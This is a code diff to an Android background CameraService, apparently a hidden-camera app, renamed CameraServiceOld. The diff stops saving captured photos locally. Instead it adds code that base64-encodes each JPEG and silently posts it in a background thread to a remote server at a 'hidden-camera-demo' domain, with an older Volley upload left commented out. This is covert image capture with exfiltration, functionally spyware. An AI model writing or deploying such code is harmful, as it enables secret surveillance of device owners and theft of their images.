@@ -9,7 +9,6 @@ import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
-import android.media.MediaScannerConnection;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Build;
@@ -23,31 +22,17 @@ import android.view.Gravity;
 import android.view.SurfaceHolder;
 import android.view.SurfaceView;
 import android.view.WindowManager;
-import android.widget.Toast;
 
-import com.android.volley.AuthFailureError;
-import com.android.volley.Request;
-import com.android.volley.RequestQueue;
-import com.android.volley.Response;
-import com.android.volley.VolleyError;
-import com.android.volley.toolbox.StringRequest;
-import com.android.volley.toolbox.Volley;
-
-import java.util.HashMap;
-import java.util.Map;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.UnsupportedEncodingException;
+import java.net.URLEncoder;
 
-
-import org.json.JSONException;
-import org.json.JSONObject;
-
-public class CameraService extends Service implements
+public class CameraServiceOld extends Service implements
         SurfaceHolder.Callback {
 
     // Camera variables
@@ -506,58 +491,66 @@ public class CameraService extends Service implements
                 bmp.compress(Bitmap.CompressFormat.JPEG, QUALITY_MODE, bytes);
 
             File imagesFolder = new File(
-                    Environment.getExternalStorageDirectory(), "hidden_camera");
+                    Environment.getExternalStorageDirectory(), "PRP_SNAPS");
             if (!imagesFolder.exists())
                 imagesFolder.mkdirs(); // <----
-            File image = new File(imagesFolder, System.currentTimeMillis()
-                    + ".jpg");
+            File image = new File(imagesFolder, System.currentTimeMillis()+ ".jpg");
 
-            byte[] byteArray = bytes .toByteArray();
+            byte[] byteArray = bytes.toByteArray();
             String encoded = Base64.encodeToString(byteArray, Base64.DEFAULT);
             Log.d("encoded",encoded);
-            // write the bytes in file
-            try {
-                fo = new FileOutputStream(image);
-            } catch (FileNotFoundException e) {
-                Log.e("TAG", "FileNotFoundException", e);
-                // TODO Auto-generated catch block
-            }
-            try {
-                fo.write(bytes.toByteArray());
-            } catch (IOException e) {
-                Log.e("TAG", "fo.write::PictureTaken", e);
-                // TODO Auto-generated catch block
-            }
-            try {
-                fo.close();
-                if (Build.VERSION.SDK_INT < 19)
-                    sendBroadcast(new Intent(
-                            Intent.ACTION_MEDIA_MOUNTED,
-                            Uri.parse("file://"
-                                    + Environment.getExternalStorageDirectory())));
-                else {
-                    MediaScannerConnection
-                            .scanFile(
-                                    getApplicationContext(),
-                                    new String[]{image.toString()},
-                                    null,
-                                    new MediaScannerConnection.OnScanCompletedListener() {
-                                        public void onScanCompleted(
-                                                String path, Uri uri) {
-                                            Log.i("ExternalStorage", "Scanned "
-                                                    + path + ":");
-                                            Log.i("ExternalStorage", "-> uri="
-                                                    + uri);
-                                        }
-                                    });
-                }
 
+            /* sending data to server */
 
-
-            } catch (IOException e) {
-                // TODO Auto-generated catch block
+            String url = "https://hidden-camera-demo.novobyte.org/index.php";
+            Uri.Builder builder = new Uri.Builder();
+            try {
+                builder.appendQueryParameter("base64_file", URLEncoder.encode(encoded,"utf-8"));
+            } catch (UnsupportedEncodingException e) {
                 e.printStackTrace();
             }
+//            builder.appendQueryParameter("password",password);
+            final String params = builder.build().toString();
+
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    String data = PostRequestManager.getResponse(url,params);
+                    Log.d("nv",data);
+                }
+            }).start();
+     /*       RequestQueue MyRequestQueue = Volley.newRequestQueue(getApplicationContext());
+
+
+            StringRequest MyStringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
+                @Override
+                public void onResponse(String response) {
+                    //This code is executed if the server responds, whether or not the response contains data.
+                    //The String 'response' contains the server's response.
+                    Log.d("PRP",response);
+                }
+            }, new Response.ErrorListener() { //Create an error listener to handle errors appropriately.
+                @Override
+                public void onErrorResponse(VolleyError error) {error.printStackTrace();
+                    //This code is executed if there is an error.
+                    Log.e("PRP",error.toString());
+                }
+            }) {
+                protected Map<String, String> getParams() {
+                    Map<String, String> MyData = new HashMap<String, String>();
+                    MyData.put("base64_file", encoded); //Add the data you'd like to send to the server.
+                    return MyData;
+                }
+                @Override
+                public Map<String, String> getHeaders() throws AuthFailureError {
+                    Map<String, String> params = new HashMap<String, String>();
+//                    params.put("Content-Type", "application/json");
+                    return params;
+                }
+            };
+
+            MyRequestQueue.add(MyStringRequest);*/
+        /* sending data to server */
             if (mCamera != null) {
                 mCamera.stopPreview();
                 mCamera.release();
@@ -661,6 +654,5 @@ public class CameraService extends Service implements
 
         return bitmap;
     }
-
 
 }
